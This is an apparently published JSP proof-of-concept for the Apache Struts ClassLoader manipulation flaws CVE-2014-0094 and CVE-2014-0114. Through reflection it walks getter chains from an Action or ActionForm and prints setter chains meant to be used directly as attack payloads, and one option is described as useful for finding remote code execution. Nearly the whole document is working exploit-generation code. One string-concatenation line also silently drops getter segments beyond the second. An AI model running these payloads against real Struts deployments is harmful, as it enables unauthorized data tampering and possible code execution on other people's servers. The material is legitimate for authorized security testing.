<!--
	
	This PoC gives a list of payloads that can be used to modify data in the 
	context of a Struts web application that is vulnerable to CVE-2014-0094 or 
	CVE-2014-0114. The results depend on the container that executes the 
	application. Is a customized version for the PoC posted by "neobyte" at 
	http://sec.baidu.com/index.php?research/detail/id/18

	Instructions:
	1.- Modify the imports to match the actions of your Struts application
	2.- In main modify the initarget to match an Action / ActionForm of
		your Struts app
	3.- Add the JSP to your Struts app
	4.- Deploy your app in an application server
	5.- Access the JSP with a browser
	  5.1.- Add "debug=true" to the parameters for getting debug info
	  5.2.- Add "cmd=[all|allp|meth]" to run one of the alternative commands, 
	  	useful when looking for RCE
	  5.3.- Add "poc=" + with a chain of previously called getters to reach 
	  	current object      

-->

<!-- Struts 2.x example -->
<!-- Import the class of the initarget Action -->
<%@ page language="java" import=
	"java.lang.reflect.*, org.apache.struts.helloworld.action.*" %>

<!-- Struts 1.x example -->
<!-- Import the class of the initarget ActionForm -->
<%--@ page language="java" import=
	"java.lang.reflect.*, com.vaannila.*" --%>

<%!
/* Find all the "set" methods that accept exactly one parameter (String, 
** boolean or int) in the given Object, or in Objects that can be reached via
** "get" methods (without parameters) in a recursive way
** 
** Params:
** - Object instance : Object to process
** - javax.servlet.jsp.JspWriter out : Where the results will be printed 
** - java.util.HashSet set : Set of previously processed Objects 
** - String poc : Chain of previously called getters to reach current object
** - int level : Current level of recursion
** - boolean debug: print extra debug information for candidates 
*/
public void processClass(
	Object instance,
	javax.servlet.jsp.JspWriter out,
	java.util.HashSet set, 
	String poc, 
	int level,
	boolean debug) {

	try {
	    
	    if (++level > 15) {
	    	return;
		}

	    Class<?> c = instance.getClass();
	    set.add(instance);
	    Method[] allMethods = c.getMethods();
	    
	    /* Print all set methods that match the desired properties:
	    ** - exactly 1 parameter (String, boolean or int)
	    ** - public modifier
	    */
	    for (Method m : allMethods) {
			if (!m.getName().startsWith("set")) {
			    continue;
			}

			if (!m.toGenericString().startsWith("public")) {
			    continue;
			}

			Class<?>[] pType  = m.getParameterTypes();
			if(pType.length!=1) continue;
			
			if(pType[0].getName().equals("java.lang.String")
				|| pType[0].getName().equals("boolean")
				|| pType[0].getName().equals("int")) {

				String fieldName = m.getName().substring(3,4).toLowerCase()
					+ m.getName().substring(4);
		    	
		    	/* Print the chain of getters plus the candidate setter in a 
		    	** format that can be directly used as a PoC for the Struts 
		    	** vulnerability. Also print the fqdn class name of the 
		    	** current Object if debug mode is 'on'. 
		    	*/
		    	if (debug) {
			    	out.print("-------------------------" + c.getName() + "<br>"); 
					out.print("Candidate: " + poc + "." + fieldName + "<br>");
		    	}
		    	else {
		    		out.print(poc + "." + fieldName + "<br>");
		    	}
				out.flush();
			}
	    }

	    /* Call recursively the current function against (not yet processed) 
	    ** Objects that can be reached using public get methods of the current 
	    ** Object (without parameters)
	    */
	    for (Method m : allMethods) {
			if (!m.getName().startsWith("get")) {
			    continue;
			}

			if (!m.toGenericString().startsWith("public")) {
			    continue;
			}

			Class<?>[] pType  = m.getParameterTypes();
			if(pType.length!=0) continue;
			if(m.getReturnType() == Void.TYPE) continue;

			/* In case of problems with reflection use
			** m.setAccessible(true);
			*/ 
			Object o = m.invoke(instance);
			if(o!=null)
			{
				if(set.contains(o)) continue;
				
				processClass(o,out, set, poc + "."
					+ m.getName().substring(3,4).toLowerCase()
					+ m.getName().substring(4), level, debug);	
			} 
	    }
	} catch (java.io.IOException x) {
	    x.printStackTrace();
	} catch (java.lang.IllegalAccessException x) {
	    x.printStackTrace();
	} catch (java.lang.reflect.InvocationTargetException x) {
	    x.printStackTrace();
	} 	
}

/*
** Print all the method names of a given Object 
*/
public void printAllMethodsNames(
	Object instance, 
	javax.servlet.jsp.JspWriter out) throws Exception {

	Method[] allMethods = instance.getClass().getMethods();
    for (Method m : allMethods) {
		out.print(m.getName() + "<br>");      
    }
}

/* Print all the method names of a given Object and the number of parameters  
** that it has
*/
public void printAllMethodsWithNumParams(
	Object instance, 
	javax.servlet.jsp.JspWriter out) throws Exception {

	Method[] allMethods = instance.getClass().getMethods();
    for (Method m : allMethods) {
    	Class<?>[] pType = m.getParameterTypes();

    	out.print("Method: " + m.getName() + " with " + pType.length 
    		+ " parameters<br>");
    }
}

/* Print the "set" methods that accept exactly one parameter (String, 
** boolean or int) and the "get" methods (without parameters) in the given 
** Object
*/
public void printMethods(
	Object instance, 
	javax.servlet.jsp.JspWriter out) throws Exception {

	Method[] allMethods = instance.getClass().getMethods();
    for (Method m : allMethods) {
    	
	    Class<?>[] pType = m.getParameterTypes();

		if(m.getName().startsWith("get") 
			&& m.toGenericString().startsWith("public")) {
			
			Class<?> returnType = m.getReturnType();

			if(pType.length == 0) {
				
				out.print("GET method: " + m.getName() + " of class" 
					+ instance.getClass().getName() + " returns " 
					+ returnType.getName() + "<br>");
			}						    	
		}

		if(m.getName().startsWith("set") 
			&& m.toGenericString().startsWith("public")) {
			
			if((pType.length == 1) && (pType[0].getName().equals("java.lang.String")
				|| pType[0].getName().equals("boolean")
				|| pType[0].getName().equals("int"))) {
				
				out.print("SET method: " + m.getName() + " of class" 
					+ instance.getClass().getName() + " with param " 
					+ pType[0].getName() + "<br>");
			}						    	
		}
    }
}

/* Return the Object that results of resolving the chain of getters described 
** by the "poc" parameter 
*/
public Object applyGetChain(
	Object initarget, 
	String poc) throws Exception {
	
	if(poc.equals("")) {
		return initarget;
	} 

	String[] parts = poc.split("\\.");

	String method = "get" + parts[0].substring(0,1).toUpperCase();

	if(parts[0].length() > 1) {
		method += parts[0].substring(1);
	}

	Class<?> c = initarget.getClass();
	Method m = c.getMethod(method, null);

	/* In case of problems with reflection use
	** m.setAccessible(true);
	*/ 
	Object o = m.invoke(initarget);

	if(parts.length == 1) {
		return o;
	}

	String newPoc = parts[1];

	for(int i=2; i<parts.length; i++) {
		newPoc.concat("." + parts[i]);
	}

	return applyGetChain(o, newPoc);
}

%>

<%
/*
** MAIN METHOD
*/
java.util.HashSet set = new java.util.HashSet<Object>();

String pocParam = request.getParameter("poc");
String poc = (pocParam != null) ? pocParam : "";

// Struts 2.x Action
HelloWorldAction initarget = new HelloWorldAction();

// Struts 1.x ActionForm
//LoginForm initarget = new LoginForm();

// Get the target Object as described by poc
Object target = applyGetChain(initarget, poc);

// Check for debug mode
String mode = request.getParameter("debug");
boolean debug = false;

if((mode != null) && (mode.equalsIgnoreCase("true"))) {
	debug = true;
}

// Switch the command to be executed
String cmd = request.getParameter("cmd");

if(cmd != null) {
	if(cmd.equalsIgnoreCase("all")) {

		printAllMethodsNames(target, out);

	} else if(cmd.equalsIgnoreCase("allp")) {

		printAllMethodsWithNumParams(target, out);

	} else if(cmd.equalsIgnoreCase("meth")) {

		printMethods(target, out);

	} else {

		processClass(target, out, set, poc, 0, debug);	

	}
} else {
	processClass(target, out, set, poc, 0, debug);	
}
%>
